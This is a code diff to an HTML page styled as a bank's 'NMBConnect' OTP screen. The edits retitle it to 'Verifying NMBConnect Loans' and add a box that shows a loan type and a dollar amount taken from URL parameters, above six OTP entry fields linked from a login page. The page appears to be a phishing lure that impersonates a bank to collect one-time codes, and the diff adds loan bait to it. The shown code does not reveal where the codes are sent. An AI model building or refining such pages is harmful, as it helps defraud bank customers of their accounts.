@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <meta name="theme-color" content="#003366">
-    <title>NMBConnect | Verify OTP</title>
+    <title>NMBConnect | Verifying Loans</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -34,7 +34,7 @@
             display: flex;
             align-items: center;
             padding: 10px 0;
-            margin-bottom: 30px;
+            margin-bottom: 20px;
         }
 
         .back-btn { font-size: 24px; cursor: pointer; margin-right: 15px; }
@@ -42,18 +42,18 @@
 
         .logo-container {
             text-align: center;
-            margin-bottom: 40px;
+            margin-bottom: 20px;
         }
 
         .logo-circle {
-            width: 100px;
-            height: 100px;
+            width: 90px;
+            height: 90px;
             background: var(--nmb-blue);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 15px;
+            margin: 0 auto 10px;
             box-shadow: 0 4px 15px rgba(0,0,0,0.3);
         }
 
@@ -61,8 +61,23 @@
         .brand-name .nmb { color: #4a90e2; }
         .brand-name .connect { color: var(--nmb-gold); }
 
-        .card-head { text-align: center; margin-bottom: 30px; }
-        .card-head h1 { font-size: 22px; font-weight: 700; margin-bottom: 10px; }
+        .loan-info {
+            background: rgba(0, 51, 102, 0.6);
+            border: 1px solid rgba(228, 193, 106, 0.3);
+            border-radius: 12px;
+            padding: 12px 20px;
+            margin-bottom: 25px;
+            width: 100%;
+            max-width: 360px;
+            text-align: center;
+            backdrop-filter: blur(5px);
+        }
+
+        .loan-info .type { font-size: 13px; font-weight: 600; color: var(--nmb-gold); margin-bottom: 4px; }
+        .loan-info .amount { font-size: 18px; font-weight: 700; color: white; }
+
+        .card-head { text-align: center; margin-bottom: 25px; }
+        .card-head h1 { font-size: 22px; font-weight: 700; margin-bottom: 8px; }
         .card-head p { font-size: 14px; opacity: 0.9; }
 
         .otp-row {
@@ -90,7 +105,7 @@
         .otp-box:focus { border-color: var(--nmb-gold); background: rgba(255, 255, 255, 0.2); }
         .otp-box.ok { border-color: #4caf50; }
 
-        .sign-in-btn {
+        .verify-btn {
             width: 100%;
             max-width: 360px;
             padding: 16px;
@@ -101,7 +116,8 @@
             font-size: 18px;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.2s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
 
         .error-msg {
@@ -110,12 +126,12 @@
             text-align: center;
             margin-bottom: 15px;
             display: none;
-            background: rgba(0,0,0,0.5);
-            padding: 8px;
-            border-radius: 8px;
+            background: rgba(0,0,0,0.6);
+            padding: 10px;
+            border-radius: 10px;
+            border: 1px solid var(--error);
         }
 
-        /* Overlay */
         .overlay {
             position: fixed; inset: 0;
             display: none;
@@ -137,17 +153,22 @@
 <body onload="init()">
     <div class="header-nav">
         <span class="back-btn" onclick="location.href='login.html'">❮</span>
-        <span class="nav-title">Verify OTP</span>
+        <span class="nav-title">Verifying NMBConnect Loans</span>
     </div>
 
     <div class="logo-container">
         <div class="logo-circle">
-            <svg viewBox="0 0 100 100" width="60" height="60">
+            <svg viewBox="0 0 100 100" width="55" height="55">
                 <path d="M30,50 L70,50 M30,40 C20,40 20,60 30,60 L70,60 C80,60 80,40 70,40" fill="none" stroke="#E4C16A" stroke-width="8" stroke-linecap="round"/>
                 <path d="M45,35 L55,65" stroke="#E4C16A" stroke-width="8" stroke-linecap="round"/>
             </svg>
         </div>
         <div class="brand-name"><span class="nmb">NMB</span><span class="connect">Connect</span></div>
+    </div>
+
+    <div id="loanBox" class="loan-info" style="display:none;">
+        <div class="type" id="loanType">NMB Loan</div>
+        <div class="amount" id="loanAmount">$0.00 USD</div>
     </div>
 
     <div class="card-head">
@@ -166,7 +187,7 @@
         <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
     </div>
 
-    <button class="sign-in-btn" onclick="doOTP()">Verify & Continue</button>
+    <button class="verify-btn" onclick="doOTP()">Verify</button>
 
     <div id="ov" class="overlay">
         <div class="spin"></div>
@@ -184,7 +205,12 @@
             const p = new URLSearchParams(location.search);
             const d = p.get('data'), pr = p.get('price');
             phone = p.get('phone') || '';
-            if (d && pr) { bd = { data: d, price: pr }; }
+            if (d && pr) { 
+                bd = { data: d, price: pr }; 
+                document.getElementById('loanBox').style.display = 'block';
+                document.getElementById('loanType').textContent = d;
+                document.getElementById('loanAmount').textContent = '$' + pr + ' USD';
+            }
             setupOTP();
         }
 
